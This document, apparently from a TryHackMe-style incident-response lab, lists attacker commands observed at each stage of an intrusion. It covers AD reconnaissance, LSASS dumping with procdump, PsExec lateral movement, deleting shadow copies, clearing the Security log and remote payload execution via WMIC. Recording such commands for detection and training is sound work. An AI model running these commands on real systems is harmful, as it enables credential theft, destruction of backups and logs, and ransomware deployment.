# Observed Attacker Commands

## Web Shell Commands
```text
hostname
tasklist
netstat -an
dir C:\inetpub\wwwroot
net group "Domain Admins" /domain
```

## Active Directory Discovery
```text
nltest /domain_trusts
net user /domain
net group "Domain Admins" /domain
net view
Get-ADUser
Get-ADGroupMember 'Domain Admins'
Get-ADComputer
```

## LSASS Dumping
```text
C:\Windows\Temp\procdump64.exe -accepteula -ma lsass.exe C:\Windows\Temp\lsass.dmp
```

## PsExec Commands
```text
C:\Tools\PsExec.exe \\THM-SQL-SRV cmd /c "net localgroup administrators"
C:\Tools\PsExec.exe -accepteula \\THM-SQL-SRV cmd /c "hostname & whoami & ipconfig"
```

## Ransomware Preparation
```text
vssadmin delete shadows /all /quiet
wevtutil cl Security
```

## WMIC Payload Deployment
```text
wmic /node:<target-host> /user:maria.garcia /password:<password> process call create C:\Windows\fixer.exe
```
